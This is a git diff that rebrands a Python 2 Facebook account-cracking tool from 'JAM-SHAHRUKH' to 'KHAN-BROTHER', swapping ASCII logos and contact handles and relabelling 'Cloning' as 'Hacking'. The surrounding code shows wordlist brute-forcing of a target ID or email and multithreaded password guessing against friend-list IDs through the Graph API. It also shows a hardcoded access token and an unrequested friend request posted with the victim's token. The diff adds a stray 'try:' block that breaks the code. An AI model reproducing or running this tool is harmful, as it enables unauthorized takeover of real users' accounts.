@@ -271,15 +271,33 @@ logo8 = """
         .$"        .z*"               ^*$e.   "*****e.
         $$ee$c   .d"                     "*$.        3.
         ^*$E")$..$"                         *   .ee==d%
-           $.d$$$*     JAM-SHAHRUKH           *  J$$$e*
+           $.d$$$*      KHAN-BROTHER           *  J$$$e*
             $$$$                            "$$$"
 
 \033[1;95m«-----------------\033[1;91mKHAN-BROTHER\033[1;95m-----------------»"""
 logo9 = """
 \033[1;95m	
-  KLOGO🔥                    
+                 
+        _______           
+    .adOOOOOOOOOba.
+   dOOOOOOOOOOOOOOOb
+  dOOOOOOOOOOOOOOOOOb
+ dOOOOOOOOOOOOOOOOOOOb
+|OOOOOOOOOOOOOOOOOOOOO|
+OP'~"YOOOOOOOOOOOP"~`YO
+OO     `YOOOOOP'     OO
+OOb   ●  `OOO' ●   dOO
+YOOo      OOO      oOOP
+`OOOo     OOO     oOOO'
+ `OOOb._,dOOOb._,dOOO'
+  `OOOOOOOOOOOOOOOOO'
+   OOOOOOOoOoOOOOOOO 
+   YOOOOOOOOOOOOOOOP
+   `OOOOOI```IOOOOO'
+    `OOOOI,,,IOOOO'
+     `OOOOOOOOOOO'
+       `~OOOOO~'   KHAN-BROTHER 
 
-                                             "KHAN-BROTHER"
                                                
  
 \033[1;95m«-----------------\033[1;91mKHAN-BROTHER\033[1;95m-----------------»"""
@@ -322,13 +340,23 @@ YOOo      OOO      oOOP
 
 \033[1;95m«-----------------\033[1;91mKHAN-BROTHER\033[1;95m-----------------»"""
 logo12 = """
-\033[1;91m•~♥~ ?̵̡?̵̨̄?✿(◡‿◡)♥☸~♥~♥~ ?̵̡?̵̨̄?✿(◡‿◡)♥☸~♥~♥~ ?̵̡?̵̨̄?✿
-░╦░╔╗╗╗╦═╗░░╔╗╔╦╗╦╔░╔═╗╔╗░ ░╗╗╗╔╔╗╔╗░
-░║░║║║║╠╣░░░╚╗║║║║║░╠╣░╚╗░ ░╠╣║║║╗╚╗░
-░╩╝╚╝╚╝╩═╝░░╚╝╝╝╝╩╚═╚═╝╚╝░ ░╝╝╚╝╚╝╚╝░
-~♥~ ?̵̡?̵̨̄?✿(◡‿◡)♥☸~♥~♥~ ?̵̡?̵̨̄?✿(◡‿◡)♥☸~♥~♥~ ?̵̡?̵̨̄?✿
+\033[1;91m
+
+██╗░░██╗██╗░░██╗░█████╗░███╗░░██╗
+██║░██╔╝██║░░██║██╔══██╗████╗░██║
+█████═╝░███████║███████║██╔██╗██║
+██╔═██╗░██╔══██║██╔══██║██║╚████║
+██║░╚██╗██║░░██║██║░░██║██║░╚███║
+╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝
+
+██╗░░░░░░█████╗░██╗░░░██╗███████╗
+██║░░░░░██╔══██╗██║░░░██║██╔════╝
+██║░░░░░██║░░██║╚██╗░██╔╝█████╗░░
+██║░░░░░██║░░██║░╚████╔╝░██╔══╝░░
+███████╗╚█████╔╝░░╚██╔╝░░███████╗
+╚══════╝░╚════╝░░░░╚═╝░░░╚══════╝
  
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;95m«-----------------\033[1;91mKHAN-BROTHER\033[1;95m-----------------»"""
 logo13 = """
 \033[1;95m•KHAN-BROTHER 	
                       :::!~!!!!!:.
@@ -543,7 +571,29 @@ logo19 = """
 \033[1;95m«-----------------\033[1;91mKHAN-BROTHER\033[1;95m-----------------»"""
 logo20 = """
 \033[1;95m	
-KLoGo🔥             
+        _______           
+    .adOOOOOOOOOba.
+   dOOOOOOOOOOOOOOOb
+  dOOOOOOOOOOOOOOOOOb
+ dOOOOOOOOOOOOOOOOOOOb
+|OOOOOOOOOOOOOOOOOOOOO|
+OP'~"YOOOOOOOOOOOP"~`YO
+OO     `YOOOOOP'     OO
+OOb   ●  `OOO' ●   dOO
+YOOo      OOO      oOOP
+`OOOo     OOO     oOOO'
+ `OOOb._,dOOOb._,dOOO'
+  `OOOOOOOOOOOOOOOOO'
+   OOOOOOOoOoOOOOOOO 
+   YOOOOOOOOOOOOOOOP
+   `OOOOOI```IOOOOO'
+    `OOOOI,,,IOOOO'
+     `OOOOOOOOOOO'
+       `~OOOOO~'   KHAN-BROTHER 
+       
+
+
+
 	     
 
 \033[1;95m«-----------------\033[1;91mKHAN-BROTHER\033[1;95m-----------------»"""
@@ -668,7 +718,15 @@ vuln = "\033[32mVhul Hoicha"
 os.system("clear")
 print  """
 \033[1;96m
-KHAN LoGo🔥
+██╗░░██╗██╗░░██╗░█████╗░███╗░░██╗
+██║░██╔╝██║░░██║██╔══██╗████╗░██║
+█████═╝░███████║███████║██╔██╗██║
+██╔═██╗░██╔══██║██╔══██║██║╚████║
+██║░╚██╗██║░░██║██║░░██║██║░╚███║
+╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝
+
+
+   IT’S NOT JUST A NAME. IT'S A BRAND      
                                      
 \033[1;95m«-----------------\033[1;91mKHAN-BROTHER\033[1;95m-----------------»"""
 jalan("\033[1;93m┳┻┳┻▇▇▇▇▇▇     ╭━━━━╮╱▔▔▔╲      ▇▇▇▇▇▇┳┻┳┻┳┻")
@@ -699,7 +757,7 @@ while (loop == 'true'):
     if (username == CorrectUsername):
     	password = raw_input("\033[1;97m🗝 \x1b[1;91mTool Password  \x1b[1;97m»» \x1b[1;97m")
         if (password == CorrectPassword):
-            print "Logged in successfully as " + username #🔰🔰🔰
+            print "Logged in successfully as " + username #Dev:KHAN_BROTHER 
 	    time.sleep(2)
             loop = 'false'
         else:
@@ -789,7 +847,7 @@ def login1():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;95mLogin Successful.•◈•..'
-				os.system('xdg-open https://m.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
+				os.system('xdg-open https://m.youtube.com/channel/UCaDycv8l8cGtCzIYR8ukEvg')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -858,7 +916,7 @@ def menu():
         time.sleep(0.05)
         print "\033[1;95mActivitie This Tool is for Educational Purpose"
         time.sleep(0.05)
-        print "\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"
+        print "\033[1;95m«-----------------\033[1;91mKHAN-BROTHER\033[1;95m-----------------»"
         time.sleep(0.05)
 	print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m1 .\x1b[1;96m\033[1;92m Start    Hacking  KHAN-BROTHER   "
         time.sleep(0.05)
@@ -1190,10 +1248,10 @@ def pilih_crack():
  Don't Worry Your Checkpoint ID Will Be Open After 7 Days 
 
 •\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;91m ....JAM-SHAHRUKH....... \033[1;95m :
+: \033[1;91m ....KHAN-BROTHER....... \033[1;95m :
 •\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 FACEBOOK 
-              \033[1;91m Mr.KhanVau420"""
+              \033[1;91mMr.KhanVau420"""
 	
 	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
 	crack()
@@ -1262,7 +1320,7 @@ def pilih_hack():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:KHAN_BROTHER🔰🔰🔰🔰🔰
+			pass #Dev:KHAN_BROTHER
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
@@ -1373,19 +1431,23 @@ def pilih_hack():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mJAM-SHAHRUKH\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;91m«---•◈•---Developed By JAM-SHAHRUKH--•◈•---»" #Dev:Jam_Shahrukh
+	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mKHAN-BROTHER\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬▬•◈•"
+	print "  \033[1;91m«---•◈•---Developed By KHAN-BROTHER--•◈•---»" #Dev:KHAN_BROTHER
 	print '\033[1;95mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (logout)↩\033[1;97m....'
-        print '\033[1;95mNext Type (python2 jam.py) Next login facebook Start Cloning\033[1;97m....'
+        print '\033[1;95mNext Type (python2 khan.py) Next login facebook Start Hacking\033[1;97m....'
 	print"\033[1;92mTotal Live/\x1b[1;91mError \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
 	print """
 Don't Worry Your Error ID Will Be Open After 7 Days 
 
 •\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;91m ....JAM-SHAHRUKH....... \033[1;95m :
-•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
-                WhatsApp Num
-              \033[1;91m +971528752764"""
+: \033[1;91m ....KHAN-BROTHER....... \033[1;95m :
+•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
+
+
+                FACEBOOK 
+              \033[1;91mMr.KhanVau420"""
+	
+	
 	
 	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
 	crack()
@@ -1402,7 +1464,7 @@ def black():
 		login()
 	os.system('clear')
 	print logo10
-	print "\033[1;97m-•◈•-\033[1;97m> \033[1;91m1.\x1b[1;93mClone Friend List Public ID."
+	print "\033[1;97m-•◈•-\033[1;97m> \033[1;91m1.\x1b[1;93mHacking Friend List Public ID."
         time.sleep(0.05)
 	print "\033[1;97m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91mBack"
 	pilih_black()
@@ -1416,7 +1478,7 @@ def pilih_black():
 		os.system('clear')
 		print logo
 		idt = raw_input("\033[1;95m[•◈•] \033[1;91mEnter ID\033[1;95m: \033[1;95m")
-		print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mJAM-SHAHRUKH\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+		print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mKHAN-BROTHER\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -1440,11 +1502,11 @@ def pilih_black():
 	jalan('\033[1;91mPlease Wait\033[1;94m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\033[1;93mHacking\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
-	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
-        jalan(' \033[1;95m         Start Cloning United State ')
+	jalan(' \033[1;93mPlz Wait Hacking Accounts Will Appear Here')
+        jalan(' \033[1;95m         Start Hacking United State ')
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
 	
 			
@@ -1454,7 +1516,7 @@ def pilih_black():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:Jam_Shahrukh
+			pass #Dev:KHAN_BROTHER 
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
@@ -1565,19 +1627,19 @@ def pilih_black():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mJAM-SHAHRUKH\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;91m«---•◈•---Developed By JAM-SHAHRUKH--•◈•---»" #Dev:Jam_Shahrukh
+	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mKHAN-BROTHER\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+	print "  \033[1;91m«---•◈•---Developed By KHAN-BROTHER--•◈•---»" #Dev:KHAN_BROTHER
 	print '\033[1;95mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (logout)↩\033[1;97m....'
-        print '\033[1;95mNext Type (python2 jam.py) Next login facebook Start Cloning\033[1;97m....'
+        print '\033[1;95mNext Type (python2 khan.py) Next login facebook Start Hacking\033[1;97m....'
 	print"\033[1;92mTotal Live/\x1b[1;91mError \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
 	print """
  Don't Worry Your Checkpoint ID Will Be Open After 7 Days 
 
 •\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;91m ....JAM-SHAHRUKH....... \033[1;95m :
+: \033[1;91m ....KHAN-BROTHER....... \033[1;95m :
 •\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
-                WhatsApp Num
-              \033[1;91m +971528752764"""
+                FACEBOOK 
+              \033[1;91mMr.KhanVau420"""
 	
 	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
 	crack()
@@ -1594,7 +1656,7 @@ def mafia():
 		login()
 	os.system('clear')
 	print logo11
-	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;95mClone Friend List Public ID."
+	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;95knacking Friend List Public ID."
         time.sleep(0.05)
 	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m0.\033[1;91mBack"
 	pilih_mafia()
@@ -1608,7 +1670,7 @@ def pilih_mafia():
 		os.system('clear')
 		print logo
 		idt = raw_input("\033[1;97m[•◈•] \033[1;94mEnter ID\033[1;97m: \033[1;97m")
-		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mJAM-SHAHRUKH\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mKHAN-BROTHER\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -1632,11 +1694,11 @@ def pilih_mafia():
 	jalan('\033[1;94mPlease Wait\033[1;94m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\033[1;93mHacking\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
-	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
-        jalan(' \033[1;95m         Start Cloning Bangladesh ')
+	jalan(' \033[1;93mPlz Wait Hacking Accounts Will Appear Here')
+        jalan(' \033[1;95m         Start Hacking Bangladesh ')
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
 	
 			
@@ -1756,20 +1818,20 @@ def pilih_mafia():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mJAM-SHAHRUKH\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;91m«---•◈•---Developed By JAM-SHAHRUKH--•◈•---»" #Dev:Jam_Shahrukh
+	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mKHAN-BROTHER\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+	print "  \033[1;91m«---•◈•---Developed By KHAN-BROTHER-•◈•---»" #Dev:KHAN_BROTHER
 	print '\033[1;95mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (logout)↩\033[1;97m....'
-        print '\033[1;95mNext Type (python2 jam.py) Next login facebook Start Cloning\033[1;97m....'
+        print '\033[1;95mNext Type (python2 khan.py) Next login facebook Start Hacking\033[1;97m....'
 	print"\033[1;92mTotal Live/\x1b[1;91mError \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
 	print """
  
 Don't Worry Your Checkpoint ID Will Be Open After 7 Days 
 
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;94m .....JAM-SHAHRUKH....... \033[1;97m :
+: \033[1;94m .....KHAN-BROTHER....... \033[1;97m :
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
-                WhatsApp Num
-              \033[1;94m +971528752764"""
+                FACEBOOK 
+              \033[1;94m Mr.KhanVau420"""
 	
 	raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
 	crack()
@@ -1786,7 +1848,7 @@ def test():
 		login()
 	os.system('clear')
 	print logo12
-	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;92mClone Friend List Public ID Testing."
+	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;92mHacking Friend List Public ID Testing."
         time.sleep(0.05)
 	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m0.\033[1;91mBack"
 	pilih_test()
@@ -1800,7 +1862,7 @@ def pilih_test():
 		os.system('clear')
 		print logo
 		idt = raw_input("\033[1;97m[•◈•] \033[1;94mEnter ID\033[1;97m: \033[1;97m")
-		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mJAM-SHAHRUKH\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mKHAN-BROTHER\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -1824,11 +1886,12 @@ def pilih_test():
 	jalan('\033[1;94mPlease Wait\033[1;94m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\033[1;93mHacking\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
-	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
-        jalan(' \033[1;95m         Start Cloning All Country ')
+	jalan(' \033[1;93mPlz Wait Hacking Accounts Will Appear Here')
+        jalan(' \033[1;95m         Start Hacking  All Country ')
+	      
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
 	
 			
@@ -1948,20 +2011,20 @@ def pilih_test():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mJAM-SHAHRUKH\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;91m«---•◈•---Developed By JAM-SHAHRUKH--•◈•---»" #Dev:Jam_Shahrukh
+	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mKHAN-BROTHER\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+	print "  \033[1;91m«---•◈•---Developed By KHAN-BROTHER--•◈•---»" #Dev:KHAN_BROTHER
 	print '\033[1;95mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (logout)↩\033[1;97m....'
-        print '\033[1;95mNext Type (python2 jam.py) Next login facebook Start Cloning\033[1;97m....'
+        print '\033[1;95mNext Type (python2 khan.py) Next login facebook Start Hacking\033[1;97m....'
 	print"\033[1;92mTotal Live/\x1b[1;91mError \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
 	print """
  
 Don't Worry Your Checkpoint ID Will Be Open After 7 Days 
 
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;94m .....JAM-SHAHRUKH....... \033[1;97m :
+: \033[1;94m .....KHAN-BROTHER....... \033[1;97m :
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
-                WhatsApp Num
-              \033[1;94m +971528752764"""
+                FACEBOOK 
+              \033[1;94mMr.KhanVau420"""
 	
 	raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
 	crack()
@@ -1978,7 +2041,7 @@ def super():
 		login()
 	os.system('clear')
 	print logo13
-	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;93mClone Friend List Public ID."
+	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;93mHacking Friend List Public ID."
         time.sleep(0.05)
 	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m0.\033[1;91mBack"
 	pilih_super()
@@ -1992,7 +2055,7 @@ def pilih_super():
 		os.system('clear')
 		print logo
 		uty = raw_input("\033[1;97m[•◈•] \033[1;94mEnter ID\033[1;97m: \033[1;97m")
-		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mJAM-SHAHRUKH\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mKHAN-BROTHER\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 		try:
 			kk = requests.get("https://graph.facebook.com/"+uty+"?access_token="+toket)
 			hh = json.loads(kk.text)
@@ -2016,11 +2079,11 @@ def pilih_super():
 	jalan('\033[1;94mPlease Wait\033[1;94m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\033[1;93mHacking\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
-	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
-        jalan(' \033[1;95m           Start Cloning Indian')
+	jalan(' \033[1;93mPlz Wait Hacking Accounts Will Appear Here')
+        jalan(' \033[1;95m           Start Hacking Indian')
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
 	
 			
@@ -2030,7 +2093,7 @@ def pilih_super():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:Jam_Shahrukh
+			pass #Dev:KHAN_BROTHER
 		try:
 			g = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			l = json.loads(a.text)
@@ -2138,20 +2201,20 @@ def pilih_super():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mJAM-SHAHRUKH\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;91m«---•◈•---Developed By JAM-SHAHRUKH--•◈•---»" #Dev:Jam_Shahrukh
+	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mKHAN-BROTHER\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+	print "  \033[1;91m«---•◈•---Developed By KHAN-BROTHER--•◈•---»" #Dev:KHAN_BROTHER
 	print '\033[1;95mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (logout)↩\033[1;97m....'
-        print '\033[1;95mNext Type (python2 jam.py) Next login facebook Start Cloning\033[1;97m....'
+        print '\033[1;95mNext Type (python2 khan.py) Next login facebook Start Hacking\033[1;97m....'
 	print"\033[1;92mTotal Live/\x1b[1;91mError \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
 	print """
  
 Don't Worry Your Checkpoint ID Will Be Open After 7 Days 
 
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;94m .....JAM-SHAHRUKH....... \033[1;97m :
+: \033[1;94m .....KHAN-BROTHER....... \033[1;97m :
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
-                WhatsApp Num
-              \033[1;94m +971528752764"""
+                FACEBOOK 
+              \033[1;94mMr.KhanVau420"""
 	
 	raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
 	crack()
@@ -2226,7 +2289,7 @@ def clone_dari_member_group():
 	print 42*"\033[1;96m♡"
 	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSelesai \033[1;97m....'
 	print"\033[1;96m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(oks))
-	print"\033[1;96m[+] \033[1;92mFile JAM-SHAHRUKH\033[1;91m:\033[1;97m out/GrupMailVuln.txt"
+	print"\033[1;96m[+] \033[1;92mFile KHAN-BROTHER\033[1;91m:\033[1;97m out/GrupMailVuln.txt"
 	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
 	crack()
 			
@@ -2245,7 +2308,7 @@ def brute():
         print '\033[1;93m ◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.'
         try:
             email = raw_input('\x1b[1;91m[●] \x1b[1;92mID\x1b[1;97m/\x1b[1;91mEmail \x1b[1;92mTarget \x1b[1;91m:\x1b[1;96m ')
-            passw = raw_input('\x1b[1;91m[●] \x1b[1;92mWordlist \x1b[1;97m(Type👉jam88170.txt) \x1b[1;91m: \x1b[1;97m')
+            passw = raw_input('\x1b[1;91m[●] \x1b[1;92mWordlist \x1b[1;97m(Type👉KHAN10m.txt) \x1b[1;91m: \x1b[1;97m')
             total = open(passw, 'r')
             total = total.readlines()
             print '\033[1;95m ◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.'
@@ -2296,7 +2359,9 @@ def brute():
 def tokenz():
 	os.system('clear')
 	print logo
-	toket = raw_input("\033[1;91m[?] \033[1;92mToken\033[1;91m : \033[1;95mCopy👉  \033[1;91mEAAAAUaZA8jlABAEZBmW0yH8w0R2XhpqqNiaQvKDkm1wCFazEcrJEzJThJrjZC3fuBFP6DFNmNnZB8ueUyVZCH7zPMulcTHZBa9ZCRHTTRTc0wneLqx5BZBruQbJQAx5pssqNnZB9qH6oHFjqWJf0yoOFkawm7hDqVYM8wCALx4xv7hi4ERoBPpgSGKAsm95Xt8fcZD  \033[1;95m👈 With out fb ID free login Paste & Enter👉")
+	toket = raw_input("\033[1;91m[?] \033[1;92mToken\033[1;91m : \033[1;95mCopy👉 \033[1;91mEAAAAUaZA8jlABAEZBmW0yH8w0R2XhpqqNiaQvKDkm1wCFazEcrJEzJThJrjZC3fuBFP6DFNmNnZB8ueUyVZCH7zPMulcTHZBa9ZCRHTTRTc0wneLqx5BZBruQbJQAx5pssqNnZB9qH6oHFjqWJf0yoOFkawm7hDqVYM8wCALx4xv7hi4ERoBPpgSGKAsm95Xt8fcZD \033[1;95m👈 With out fb ID free login Paste & Enter👉")
+	try:
+			
 	try:
 		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
 		a = json.loads(otw.text)
@@ -2394,11 +2459,11 @@ def pilih_phone():
 	jalan('\033[1;94mPlease Wait\033[1;94m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\033[1;93mHacking\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
-	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
